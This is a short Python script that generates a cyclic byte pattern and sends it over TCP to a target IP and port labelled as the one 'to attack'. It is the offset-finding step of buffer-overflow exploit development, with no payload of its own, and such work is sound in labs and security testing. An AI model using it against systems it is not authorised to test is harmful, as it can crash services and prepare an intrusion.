#!/usr/bin/python3

import socket
import argparse


def create_pattern(length):
    pos1="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    pos2="abcdefghijklmnopqrstuvwxyz"
    pos3="0123456789"

    pattern = ""
    while len(pattern) < length:
        for i in pos1:
            for ii in pos2:
                for iii in pos3:
                    pattern += i + ii + iii
    
    return bytes(pattern[:length], "utf8")

args = argparse.ArgumentParser()
args.add_argument("ip", help="The IP to attack.")
args.add_argument("port", help="The port to attack.", type=int)
args.add_argument("length", help="Length of the cyclic pattern", type=int)
args = args.parse_args()

buf = create_pattern(args.length)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((args.ip, args.port))
    print(sock.recv(1024).decode())
    print(f"Sending pattern.")
    sock.send(buf)
    print(sock.recv(1024))
    sock.close
except Exception as error:
    print("It's dead Jim!")
    print(error)
